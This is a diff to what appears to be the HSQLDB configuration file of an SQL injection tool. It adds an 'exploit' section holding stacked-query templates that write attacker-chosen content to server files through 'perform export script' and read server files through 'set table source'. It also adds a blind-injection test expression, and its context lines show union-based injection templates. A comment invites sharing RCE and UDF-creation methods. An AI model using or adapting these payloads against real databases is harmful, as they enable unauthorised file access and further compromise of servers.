@@ -106,11 +106,26 @@ resource:
    fields:
     field: trim(ifnull(convert(${field.value}, sql_varchar), ''))
     concat: "|| '%7f' ||"
+
  exploit: |
+  # [contribute] share following exploit methodologies on GitHub to improve the app :
+  # - read and write files
+  # - UDF creation
+  # - RCE
+  
   file:
-   createTable: ; create table %s (s varchar(255))
-   insertRow: ; insert into %s (s) values ('%s')
-   export: ; perform export script for table %s data to '%s'
+    write: |
+      ; create table %s (s varchar(255))
+      ; insert into %s (s) values ('%s')
+      ; perform export script for table %s data to '%s'
+  
+    read:
+      # semicolon ';fs=\n;encoding=UTF-8' not possible in 'set table source'
+      # java client can return 'statement does not generate a result set'
+      createTable: ; create text table %s (c varchar(9999)); set table %s source "%s"
+      result: select group_concat(c order by c separator '\n')||'%s'r from %s
+      # not working, must read file exported only by perform export statement
+      performImport: ; perform import script data from %s continue on error
 
 strategy:
  configuration:
@@ -142,6 +157,7 @@ strategy:
     - HSQLDB
    orderByErrorMessage:
     - invalid ORDER BY expression
+   vendorSpecific: casewhen(${test}, 'a', convert(uuid(),sql_varchar))='a'
 
  union:
   indices: union select ${result_range} from (${indice_unique}) b
